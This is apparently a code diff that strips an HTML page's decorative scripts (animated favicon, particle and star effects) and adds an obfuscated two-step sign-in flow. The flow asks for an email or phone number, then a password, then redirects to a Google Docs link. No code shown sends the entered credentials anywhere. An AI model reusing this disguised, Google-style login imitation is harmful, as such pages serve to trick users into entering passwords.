-        const tempCanvas = document.createElement('canvas');
-        tempCanvas.width = 32;
-        tempCanvas.height = 32;
-        const tempCtx = tempCanvas.getContext('2d', { alpha: true });
-        tempCtx.imageSmoothingEnabled = true;
-        tempCtx.imageSmoothingQuality = 'high';
-    
-        // Get favicon link element
-        const faviconLink = document.getElementById('favicon');
-        let offset = 0;
-    
-        function updateFavicon() {
-            // Clear canvas with transparency
-            ctx.clearRect(0, 0, 64, 64);
-    
-            // Create gradient
-            const gradient = ctx.createLinearGradient(0, 0, 64, 0);
-            
-            // Gradient with color stops
-            gradient.addColorStop((0 + offset) % 1, 'rgb(123, 31, 162)');
-            gradient.addColorStop((0.2 + offset) % 1, 'rgb(103, 58, 183)');
-            gradient.addColorStop((0.4 + offset) % 1, 'rgb(244, 143, 177)');
-            gradient.addColorStop((0.6 + offset) % 1, 'rgb(123, 31, 162)');
-            gradient.addColorStop((0.8 + offset) % 1, 'rgb(103, 58, 183)');
-            gradient.addColorStop((1 + offset) % 1, 'rgb(123, 31, 162)');
-    
-            // Draw text
-            ctx.textAlign = 'center';
-            ctx.textBaseline = 'middle';
-            ctx.font = 'bold 56px Inter, Arial';
-            ctx.fillStyle = gradient;
-            ctx.fillText('K', 32, 36);
-    
-            // Update offset for next frame
-            offset = (offset + 0.01) % 1;
-    
-            // Downscale to favicon size
-            tempCtx.clearRect(0, 0, 32, 32);
-            tempCtx.drawImage(faviconCanvas, 0, 0, 32, 32);
-            
-            // Update favicon
-            faviconLink.href = tempCanvas.toDataURL('image/png');
-            
-            requestAnimationFrame(updateFavicon);
+        const zbt = document.getElementById('zbt');
+        const uqt = document.getElementById('uqt');
+        const sgh = document.getElementById('sgh');
+        const aef = document.getElementById('aef');
+        const kzs = document.getElementById('kzs');
+        const ijm = document.getElementById('ijm');
+        const cfk = document.getElementById('cfk');
+        const gpy = document.getElementById('gpy');
+        const vyh = document.getElementById('vyh');
+        const mqr = document.getElementById('mqr');
+        const xnj = document.getElementById('xnj');
+        const rwl = document.getElementById('rwl');
+        const tdq = document.getElementById('tdq');
+        const zlm = document.getElementById('zlm');
+        const yvp = document.getElementById('yvp'); // Added white overlay reference
+
+        let oxc;
+        let hfo;
+
+        function bdi(t, d = 4000) {
+            if (oxc) clearTimeout(oxc);
+            zbt.textContent = t;
+            zbt.classList.add('jxa');
+            oxc = setTimeout(plw, d);
         }
-    
-        // Start animation when fonts are loaded
-        document.fonts.ready.then(() => {
-            updateFavicon();
-        });
-    </script>
-    
-    <script>
-        particlesJS('particles-js',
-        {
-            "particles": {
-                "number": {
-                    "value": 80,
-                    "density": {
-                        "enable": true,
-                        "value_area": 800
-                    }
-                },
-                "color": {
-                    "value": "#8A2BE2"
-                },
-                "shape": {
-                    "type": "circle"
-                },
-                "opacity": {
-                    "value": 0.5,
-                    "random": false
-                },
-                "size": {
-                    "value": 3,
-                    "random": true
-                },
-                "line_linked": {
-                    "enable": true,
-                    "distance": 150,
-                    "color": "#8A2BE2",
-                    "opacity": 0.4,
-                    "width": 1
-                },
-                "move": {
-                    "enable": true,
-                    "speed": 2,
-                    "direction": "none",
-                    "random": false,
-                    "straight": false,
-                    "out_mode": "out",
-                    "bounce": false
-                }
-            },
-            "interactivity": {
-                "detect_on": "canvas",
-                "events": {
-                    "onhover": {
-                        "enable": true,
-                        "mode": "grab"
-                    },
-                    "onclick": {
-                        "enable": true,
-                        "mode": "push"
-                    },
-                    "resize": true
-                },
-                "modes": {
-                    "grab": {
-                        "distance": 140,
-                        "line_linked": {
-                            "opacity": 1
-                        }
-                    },
-                    "push": {
-                        "particles_nb": 4
-                    }
-                }
-            },
-            "retina_detect": true
-        });
-    </script>
-    <script>
-        // Magic star animation
-        document.addEventListener('DOMContentLoaded', () => {
-            const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
 
-            const animateStar = star => {
-                star.style.setProperty("--star-left", `${rand(-10, 100)}%`);
-                star.style.setProperty("--star-top", `${rand(-40, 80)}%`);
-                star.style.animation = "none";
-                star.offsetHeight;
-                star.style.animation = "";
-            };
+        function plw() {
+             if (oxc) clearTimeout(oxc);
+             oxc = null;
+            zbt.classList.remove('jxa');
+        }
+        zbt.addEventListener('click', plw);
 
-            // Set initial positions for magic stars
-            const stars = document.querySelectorAll('.magic-star');
-            stars.forEach((star, i) => {
-                star.style.setProperty("--star-left", `${rand(-10, 100)}%`);
-                star.style.setProperty("--star-top", `${rand(-40, 80)}%`);
-            });
+        gpy.addEventListener('click', function() {
+            const _v1 = kzs.value.trim();
+            if (_v1) {
+                plw();
 
-            // Handle hover effects
-            document.querySelectorAll('.magic').forEach(magicElement => {
-                const magicStars = magicElement.querySelectorAll('.magic-star');
-                
-                magicElement.addEventListener('mouseenter', () => {
-                    magicStars.forEach((star, i) => {
-                        setTimeout(() => {
-                            animateStar(star);
-                            star._interval = setInterval(() => animateStar(star), 1000);
-                        }, i * 300);
+                gpy.disabled = true;
+
+                xnj.classList.remove('hidden');
+                rwl.getBoundingClientRect();
+                rwl.classList.add('psz');
+
+                tdq.classList.add('jxa');
+
+                if (hfo) clearTimeout(hfo);
+
+                hfo = setTimeout(() => {
+                    cfk.textContent = _v1;
+                    uqt.classList.add('hidden');
+                    sgh.classList.remove('hidden');
+
+                    requestAnimationFrame(() => {
+                         setTimeout(() => {
+                             aef.classList.add('jxa');
+                             ijm.focus();
+                         }, 10);
                     });
-                });
-                
-                magicElement.addEventListener('mouseleave', () => {
-                    magicStars.forEach(star => {
-                        if (star._interval) {
-                            clearInterval(star._interval);
-                            star._interval = null;
-                        }
-                    });
-                });
-            });
-        });
-    </script>
-    <script>
-        // Logo visibility on scroll
-        document.addEventListener('DOMContentLoaded', () => {
-            const logoContainer = document.querySelector('.logo-container');
-            const heroSection = document.querySelector('.hero');
-            
-            if (logoContainer && heroSection) {
-                window.addEventListener('scroll', () => {
-                    const heroBottom = heroSection.getBoundingClientRect().bottom;
-                    
-                    if (heroBottom <= 200) {
-                        logoContainer.classList.add('visible');
-                    } else {
-                        logoContainer.classList.remove('visible');
-                    }
-                });
+
+                    setTimeout(() => {
+                         xnj.classList.add('hidden');
+                         rwl.classList.remove('psz');
+                         rwl.style.transform = 'translateX(-100%)';
+                         gpy.disabled = false;
+                         tdq.classList.remove('jxa');
+                     }, 300);
+
+                }, 500);
+
+            } else {
+                 bdi('Please enter your email or phone number.');
             }
         });
+
+        kzs.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                gpy.click();
+            }
+        });
+
+        vyh.addEventListener('click', function() {
+            xnj.classList.remove('hidden');
+            rwl.getBoundingClientRect();
+            rwl.style.transitionDuration = '300ms';
+            rwl.classList.add('psz');
+
+            setTimeout(() => {
+                window.location.href = 'https://docs.google.com/document/d/1_uJ6MBjvXqP3WAGMbAOiEnpm-RebuuAbP9gQKnNCJFI/edit?tab=t.0';
+            }, 350);
+        });
+
+        ijm.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                vyh.click();
+            }
+        });
+
+        mqr.addEventListener('change', function() {
+            ijm.type = this.checked ? 'text' : 'password';
+         });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            if (kzs.matches(':autofill') || kzs.value) {
+                const label = kzs.nextElementSibling;
+                if (label && label.tagName === 'LABEL') {
+                }
+            }
+
+            aef.classList.remove('jxa');
+            tdq.classList.remove('jxa');
+
+            // Fade out white overlay
+            setTimeout(() => {
+                if(yvp) {
+                    yvp.style.opacity = '0';
+                }
+            }, 1200);
+
+            // Show main overlay
+            setTimeout(() => {
+                if(zlm) {
+                    zlm.classList.add('kfo');
+                }
+            }, 1500);
+
+        });
+
     </script>
 </body>
 </html>
